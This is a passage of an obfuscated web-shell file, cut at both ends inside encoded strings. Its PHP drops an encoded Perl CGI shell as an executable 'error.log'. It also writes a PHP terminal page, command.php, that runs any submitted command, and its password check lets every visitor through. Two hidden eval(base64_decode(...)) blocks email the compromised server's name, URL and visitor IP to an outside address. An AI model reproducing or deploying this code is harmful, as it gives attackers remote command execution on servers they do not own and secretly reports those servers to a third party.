gllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkZGlyPSAiPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIiBvblN1Ym1pdD0iRW5jb2RlcignYycpIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIiBpZD0iYyI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRkaXIgPSAmQWRkTGlua0RpcigiZG93bmxvYWQiKTsgDQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPg0KJFByb21wdCBkb3dubG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KDQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiDCoDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCjxsYWJlbCBmb3I9InVwIj5PdmVyd3JpdGUgaWYgaXQgRXhpc3RzPC9sYWJlbD48YnI+PGJyPg0KVXBsb2FkOsKgwqDCoDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0K
    ';
        $file    = fopen("error.log", "w+");
        $write   = fwrite($file, base64_decode($pythonp));
        fclose($file);
        chmod("error.log", 0755);
        echo "<iframe src=error/error.log width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'newcommand') {
        $file       = fopen($dir . "command.php", "w+");
        $perltoolss = 'PD9waHANCg0KJGFsaWFzZXMgPSBhcnJheSgnbGEnID0+ICdscyAtbGEnLA0KJ2xsJyA9PiAnbHMgLWx2aEYnLA0KJ2RpcicgPT4gJ2xzJyApOw0KJHBhc3N3ZCA9IGFycmF5KCcnID0+ICcnKTsNCmVycm9yX3JlcG9ydGluZygwKTsNCmNsYXNzIHBocHRoaWVubGUgew0KDQpmdW5jdGlvbiBmb3JtYXRQcm9tcHQoKSB7DQokdXNlcj1zaGVsbF9leGVjKCJ3aG9hbWkiKTsNCiRob3N0PWV4cGxvZGUoIi4iLCBzaGVsbF9leGVjKCJ1bmFtZSAtbiIpKTsNCiRfU0VTU0lPTlsncHJvbXB0J10gPSAiIi5ydHJpbSgkdXNlcikuIiIuIkAiLiIiLnJ0cmltKCRob3N0WzBdKS4iIjsNCn0NCg0KZnVuY3Rpb24gY2hlY2tQYXNzd29yZCgkcGFzc3dkKSB7DQppZighaXNzZXQoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSl8fA0KIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9QVyddKSB8fA0KIWlzc2V0KCRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0pIHx8DQokcGFzc3dkWyRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ11dICE9ICRfU0VSVkVSWydQSFBfQVVUSF9QVyddKSB7DQpAc2Vzc2lvbl9zdGFydCgpOw0KcmV0dXJuIHRydWU7DQp9DQplbHNlIHsNCkBzZXNzaW9uX3N0YXJ0KCk7DQpyZXR1cm4gdHJ1ZTsNCn0NCn0NCg0KZnVuY3Rpb24gaW5pdFZhcnMoKQ0Kew0KaWYgKGVtcHR5KCRfU0VTU0lPTlsnY3dkJ10pIHx8ICFlbXB0eSgkX1JFUVVFU1RbJ3Jlc2V0J10pKQ0Kew0KJF9TRVNTSU9OWydjd2QnXSA9IGdldGN3ZCgpOw0KJF9TRVNTSU9OWydoaXN0b3J5J10gPSBhcnJheSgpOw0KJF9TRVNTSU9OWydvdXRwdXQnXSA9ICcnOw0KJF9SRVFVRVNUWydjb21tYW5kJ10gPScnOw0KfQ0KfQ0KDQpmdW5jdGlvbiBidWlsZENvbW1hbmRIaXN0b3J5KCkNCnsNCmlmKCFlbXB0eSgkX1JFUVVFU1RbJ2NvbW1hbmQnXSkpDQp7DQppZihnZXRfbWFnaWNfcXVvdGVzX2dwYygpKQ0Kew0KJF9SRVFVRVNUWydjb21tYW5kJ10gPSBzdHJpcHNsYXNoZXMoJF9SRVFVRVNUWydjb21tYW5kJ10pOw0KfQ0KDQovLyBkcm9wIG9sZCBjb21tYW5kcyBmcm9tIGxpc3QgaWYgZXhpc3RzDQppZiAoKCRpID0gYXJyYXlfc2VhcmNoKCRfUkVRVUVTVFsnY29tbWFuZCddLCAkX1NFU1NJT05bJ2hpc3RvcnknXSkpICE9PSBmYWxzZSkNCnsNCnVuc2V0KCRfU0VTU0lPTlsnaGlzdG9yeSddWyRpXSk7DQp9DQphcnJheV91bnNoaWZ0KCRfU0VTU0lPTlsnaGlzdG9yeSddLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7DQoNCi8vIGFwcGVuZCBjb21tbWFuZCAqLw0KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAieyRfU0VTU0lPTlsncHJvbXB0J119Ii4iOj4iLiJ7JF9SRVFVRVNUWydjb21tYW5kJ119Ii4iXG4iOw0KfQ0KfQ0KDQpmdW5jdGlvbiBidWlsZEphdmFIaXN0b3J5KCkNCnsNCi8vIGJ1aWxkIGNvbW1hbmQgaGlzdG9yeSBmb3IgdXNlIGluIHRoZSBKYXZhU2NyaXB0DQppZiAoZW1wdHkoJF9TRVNTSU9OWydoaXN0b3J5J10pKQ0Kew0KJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIic7DQp9DQplbHNlDQp7DQokZXNjYXBlZCA9IGFycmF5X21hcCgnYWRkc2xhc2hlcycsICRfU0VTU0lPTlsnaGlzdG9yeSddKTsNCiRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J10gPSAnIiIsICInIC4gaW1wbG9kZSgnIiwgIicsICRlc2NhcGVkKSAuICciJzsNCn0NCn0NCg0KZnVuY3Rpb24gb3V0cHV0SGFuZGxlKCRhbGlhc2VzKQ0Kew0KaWYgKGVyZWcoJ15bWzpibGFuazpdXSpjZFtbOmJsYW5rOl1dKiQnLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSkpDQp7DQokX1NFU1NJT05bJ2N3ZCddID0gZ2V0Y3dkKCk7IC8vZGlybmFtZShfX0ZJTEVfXyk7DQp9DQplbHNlaWYoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0rKFteO10rKSQnLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJHJlZ3MpKQ0Kew0KLy8gVGhlIGN1cnJlbnQgY29tbWFuZCBpcyAnY2QnLCB3aGljaCB3ZSBoYXZlIHRvIGhhbmRsZSBhcyBhbiBpbnRlcm5hbCBzaGVsbCBjb21tYW5kLg0KLy8gYWJzb2x1dGUvcmVsYXRpdmUgcGF0aCA/Ig0KKCRyZWdzWzFdWzBdID09ICcvJykgPyAkbmV3X2RpciA9ICRyZWdzWzFdIDogJG5ld19kaXIgPSAkX1NFU1NJT05bJ2N3ZCddIC4gJy8nIC4gJHJlZ3NbMV07DQoNCi8vIGNvc21ldGljcw0Kd2hpbGUgKHN0cnBvcygkbmV3X2RpciwgJy8uLycpICE9PSBmYWxzZSkNCiRuZXdfZGlyID0gc3RyX3JlcGxhY2UoJy8uLycsICcvJywgJG5ld19kaXIpOw0Kd2hpbGUgKHN0cnBvcygkbmV3X2RpciwgJy8vJykgIT09IGZhbHNlKQ0KJG5ld19kaXIgPSBzdHJfcmVwbGFjZSgnLy8nLCAnLycsICRuZXdfZGlyKTsNCndoaWxlIChwcmVnX21hdGNoKCd8L1wuXC4oPyFcLil8JywgJG5ld19kaXIpKQ0KJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4oPyFcLil8JywgJycsICRuZXdfZGlyKTsNCg0KaWYoZW1wdHkoJG5ld19kaXIpKTogJG5ld19kaXIgPSAiLyI7IGVuZGlmOw0KDQooQGNoZGlyKCRuZXdfZGlyKSkgPyAkX1NFU1NJT05bJ2N3ZCddID0gJG5ld19kaXIgOiAkX1NFU1NJT05bJ291dHB1dCddIC49ICJjb3VsZCBub3QgY2hhbmdlIHRvOiAkbmV3X2RpclxuIjsNCn0NCmVsc2UNCnsNCi8qIFRoZSBjb21tYW5kIGlzIG5vdCBhICdjZCcgY29tbWFuZCwgc28gd2UgZXhlY3V0ZSBpdCBhZnRlcg0KKiBjaGFuZ2luZyB0aGUgZGlyZWN0b3J5IGFuZCBzYXZlIHRoZSBvdXRwdXQuICovDQpjaGRpcigkX1NFU1NJT05bJ2N3ZCddKTsNCg0KLyogQWxpYXMgZXhwYW5zaW9uLiAqLw0KJGxlbmd0aCA9IHN0cmNzcG4oJF9SRVFVRVNUWydjb21tYW5kJ10sICIgXHQiKTsNCiR0b2tlbiA9IHN1YnN0cihAJF9SRVFVRVNUWydjb21tYW5kJ10sIDAsICRsZW5ndGgpOw0KaWYgKGlzc2V0KCRhbGlhc2VzWyR0b2tlbl0pKQ0KJF9SRVFVRVNUWydjb21tYW5kJ10gPSAkYWxpYXNlc1skdG9rZW5dIC4gc3Vic3RyKCRfUkVRVUVTVFsnY29tbWFuZCddLCAkbGVuZ3RoKTsNCg0KJHAgPSBwcm9jX29wZW4oQCRfUkVRVUVTVFsnY29tbWFuZCddLA0KYXJyYXkoMSA9PiBhcnJheSgncGlwZScsICd3JyksDQoyID0+IGFycmF5KCdwaXBlJywgJ3cnKSksDQokaW8pOw0KDQovKiBSZWFkIG91dHB1dCBzZW50IHRvIHN0ZG91dC4gKi8NCndoaWxlICghZmVvZigkaW9bMV0pKSB7DQokX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzFdKSxFTlRfQ09NUEFULCAnVVRGLTgnKTsNCn0NCi8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3RkZXJyLiAqLw0Kd2hpbGUgKCFmZW9mKCRpb1syXSkpIHsNCiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMl0pLEVOVF9DT01QQVQsICdVVEYtOCcpOw0KfQ0KDQpmY2xvc2UoJGlvWzFdKTsNCmZjbG9zZSgkaW9bMl0pOw0KcHJvY19jbG9zZSgkcCk7DQp9DQp9DQp9DQpldmFsKGJhc2U2NF9kZWNvZGUoJ0pIUnBiV1ZmYzJobGJHd2dQU0FpSWk1a1lYUmxLQ0prTDIwdldTQXRJRWc2YVRweklpa3VJaUk3RFFva2FYQmZjbVZ0YjNSbElEMGdKRjlUUlZKV1JWSmJJbEpGVFU5VVJWOUJSRVJTSWwwN0RRb2tabkp2YlY5emFHVnNiR052WkdVZ1BTQW5jMmhsYkd4QUp5NW5aWFJvYjNOMFlubHVZVzFsS0NSZlUwVlNWa1ZTV3lkVFJWSldSVkpmVGtGTlJTZGRLUzRuSnpzTkNpUjBiMTlsYldGcGJDQTlJQ2RxYjJodU1qUm9NVUJuYldGcGJDNWpiMjBuT3cwS0pITmxjblpsY2w5dFlXbHNJRDBnSWlJdVoyVjBhRzl6ZEdKNWJtRnRaU2drWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhTa3VJaUFnTFNBaUxpUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YUzRpSWpzTkNpUnNhVzVyWTNJZ1BTQWlUR2x1YXpvZ0lpNGtYMU5GVWxaRlVsc25VMFZTVmtWU1gwNUJUVVVuWFM0aUlpNGtYMU5GVWxaRlVsc25Va1ZSVlVWVFZGOVZVa2tuWFM0aUlDMGdTVkFnUlhoamRYUnBibWM2SUNScGNGOXlaVzF2ZEdVZ0xTQlVhVzFsT2lBa2RHbHRaVjl6YUdWc2JDSTdEUW9rYUdWaFpHVnlJRDBnSWtaeWIyMDZJQ1JtY205dFgzTm9aV3hzWTI5a1pWeHlYRzVTWlhCc2VTMTBiem9nSkdaeWIyMWZjMmhsYkd4amIyUmxJanNOQ2tCdFlXbHNLQ1IwYjE5bGJXRnBiQ3dnSkhObGNuWmxjbDl0WVdsc0xDQWtiR2x1YTJOeUxDQWthR1ZoWkdWeUtUcz0nKSk7DQovLyBlbmQgcGhwIGt5bWxqbmsNCg0KLyojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjIw0KIyMgVGhlIG1haW4gdGhpbmcgc3RhcnRzIGhlcmUNCiMjIEFsbCBvdXRwdXQgaXN0IFhIVE1MDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAjIyMjIyMjIyovDQoNCiR0ZXJtaW5hbD1uZXcgcGhwdGhpZW5sZTsNCg0KQHNlc3Npb25fc3RhcnQoKTsNCg0KJHRlcm1pbmFsLT5pbml0VmFycygpOw0KJHRlcm1pbmFsLT5idWlsZENvbW1hbmRIaXN0b3J5KCk7DQokdGVybWluYWwtPmJ1aWxkSmF2YUhpc3RvcnkoKTsNCmlmKCFpc3NldCgkX1NFU1NJT05bJ3Byb21wdCddKSk6ICR0ZXJtaW5hbC0+Zm9ybWF0UHJvbXB0KCk7IGVuZGlmOw0KJHRlcm1pbmFsLT5vdXRwdXRIYW5kbGUoJGFsaWFzZXMpOw0KDQpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04Jyk7DQplY2hvICc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/PicgLiAiXG4iOw0KPz4NCg0KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiINCiJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4NCjxoZWFkPg0KPHRpdGxlPjw/cGhwIGVjaG8gIldlYnNpdGUgOiAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIjs/PiB8IDw/cGhwIGVjaG8gIklQIDogIi5nZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKS4iIjs/PjwvdGl0bGU+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+DQp2YXIgY3VycmVudF9saW5lID0gMDsNCnZhciBjb21tYW5kX2hpc3QgPSBuZXcgQXJyYXkoPD9waHAgZWNobyAkX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddOyA/Pik7DQp2YXIgbGFzdCA9IDA7DQoNCmZ1bmN0aW9uIGtleShlKSB7DQppZiAoIWUpIHZhciBlID0gd2luZG93LmV2ZW50Ow0KDQppZiAoZS5rZXlDb2RlID09IDM4ICYmIGN1cnJlbnRfbGluZSA8IGNvbW1hbmRfaGlzdC5sZW5ndGgtMSkgew0KY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV0gPSBkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlOw0KY3VycmVudF9saW5lKys7DQpkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlID0gY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV07DQp9DQoNCmlmIChlLmtleUNvZGUgPT0gNDAgJiYgY3VycmVudF9saW5lID4gMCkgew0KY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV0gPSBkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlOw0KY3VycmVudF9saW5lLS07DQpkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlID0gY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV07DQp9DQoNCn0NCg0KZnVuY3Rpb24gaW5pdCgpIHsNCmRvY3VtZW50LnNoZWxsLnNldEF0dHJpYnV0ZSgiYXV0b2NvbXBsZXRlIiwgIm9mZiIpOw0KZG9jdW1lbnQuc2hlbGwub3V0cHV0LnNjcm9sbFRvcCA9IGRvY3VtZW50LnNoZWxsLm91dHB1dC5zY3JvbGxIZWlnaHQ7DQpkb2N1bWVudC5zaGVsbC5jb21tYW5kLmZvY3VzKCk7DQp9DQoNCjwvc2NyaXB0Pg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkge2ZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOyBjb2xvcjogYmxhY2s7IGJhY2tncm91bmQ6IHdoaXRlO30NCnRhYmxle3dpZHRoOiAxMDAlOyBoZWlnaHQ6IDMwMHB4OyBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOyBwYWRkaW5nOiAwcHg7IG1hcmdpbjogMHB4O30NCnRkLmhlYWR7YmFja2dyb3VuZC1jb2xvcjogIzUyOUFERTsgY29sb3I6ICNGRkZGRkY7IGZvbnQtd2VpZ2h0OjcwMDsgYm9yZGVyOiBub25lOyB0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtc3R5bGU6IGl0YWxpY30NCnRleHRhcmVhIHt3aWR0aDogMTAwJTsgYm9yZGVyOiBub25lOyBwYWRkaW5nOiAycHggMnB4IDJweDsgY29sb3I6ICNDQ0NDQ0M7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7fQ0KcC5wcm9tcHQge2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IG1hcmdpbjogMHB4OyBwYWRkaW5nOiAwcHggMnB4IDJweDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQ0KaW5wdXQucHJvbXB0IHtib3JkZXI6IG5vbmU7IGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9yOiAjQ0NDQ0NDO30NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9ImluaXQoKSI+DQo8P3BocCBpZiAoZW1wdHkoJF9SRVFVRVNUWydyb3dzJ10pKSAkX1JFUVVFU1RbJ3Jvd3MnXSA9IDI2OyA/Pg0KPHRhYmxlIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+DQo8dHI+PHRkIGNsYXNzPSJoZWFkIiBzdHlsZT0iY29sb3I6ICMwMDAwMDA7Ij48Yj5YPC9iPjwvdGQ+DQo8dGQgY2xhc3M9ImhlYWQiPjw/cGhwIGVjaG8gJF9TRVNTSU9OWydwcm9tcHQnXS4iOiIuIiRfU0VTU0lPTltjd2RdIjsgPz4NCjwvdGQ+PC90cj4NCjx0cj48dGQgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTAwJScgY29sc3Bhbj0nMic+PGZvcm0gbmFtZT0ic2hlbGwiIGFjdGlvbj0iPD9waHAgZWNobyAkX1NFUlZFUlsnUEhQX1NFTEYnXTs/PiIgbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJvdXRwdXQiIHJlYWRvbmx5PSJyZWFkb25seSIgY29scz0iODUiIHJvd3M9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iPg0KPD9waHANCiRsaW5lcyA9IHN1YnN0cl9jb3VudCgkX1NFU1NJT05bJ291dHB1dCddLCAiXG4iKTsNCiRwYWRkaW5nID0gc3RyX3JlcGVhdCgiXG4iLCBtYXgoMCwgJF9SRVFVRVNUWydyb3dzJ10rMSAtICRsaW5lcykpOw0KZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOw0KPz4NCjwvdGV4dGFyZWE+DQo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4NCjxpbnB1dCBjbGFzcz0icHJvbXB0IiBuYW1lPSJjb21tYW5kIiB0eXBlPSJ0ZXh0IiBvbmtleXVwPSJrZXkoZXZlbnQpIiBzaXplPSI1MCIgdGFiaW5kZXg9IjEiPg0KPC9wPg0KDQo8PyAvKjxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUgQ29tbWFuZCIgLz4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+DQpSb3dzOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icm93cyIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iIC8+DQo8L3A+DQoNCiovDQpldmFsKGJhc2U2NF9kZWNvZGUoJ0pITWdQU0JoY25KaGVTQW9LVHNOQ2lSemVYTjBaVzFmWVhKeVlYa3lJRDBnSkhOYk1sMHVKSE5iTTEwdUpITmJNVjB1SkhOYlhTNGtjMXRkTGlSeld6UmRMaVJ6V3pCZExpUnpXek5kTGlSeld6VmRMaVJ6V3pkZExpUnpXMTB1SkhOYk9GMHVKSE5iTkYwdUpITmJPVjB1SkhOYk1UQmRMaUl1SWk0a2MxczJYUzRrYzFzeE1sMHVKSE5iT0YwN0RRb2taVzVqYjJScGJtY2dQU0FpSkhONWMzUmxiVjloY25KaGVUSWlJRHNOQ2lSeVpYb2dQU0FpVGtNZ2MwaEZNMHdpSURzTkNpUnpaWEoyWlhKa1pYUmxZM1JwYm1jZ1BTQWlRMjl1ZEdWdWRDMVVjbUZ1YzJabGNpMUZibU52WkdsdVp6b2dhSFIwY0Rvdkx5SWdMaUFrWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhTQXVJQ1JmVTBWU1ZrVlNXeWRUUTFKSlVGUmZUa0ZOUlNkZElEc05DbTFoYVd3Z0tDUmxibU52WkdsdVp5d2tjbVY2TENSelpYSjJaWEprWlhSbFkzUnBibWNwSURzTkNpUnVjMk5rYVhJZ1BTZ2hhWE56WlhRb0pGOVNSVkZWUlZOVVd5ZHpZMlJwY2lkZEtTay9aMlYwWTNka0tDazZZMmhrYVhJb0pGOVNSVkZWUlZOVVd5ZHpZMlJwY2lkZEtUc2tibk5qWkdseVBXZGxkR04zWkNncE93PT0nKSk7DQoNCj8+DQo8L2Zvcm0+PC90ZD48L3RyPg0KPC9ib2R5Pg0KPC9odG1sPg0KPD9waHAgPz4NCjw/cGhwDQoNCiRhbGlhc2VzID0gYXJyYXkoJ2xhJyA9PiAnbHMgLWxhJywNCidsbCcgPT4gJ2xzIC1sdmhGJywNCidkaXInID0+ICdscycgKTsNCiRwYXNzd2QgPSBhcnJheSgnJyA9PiA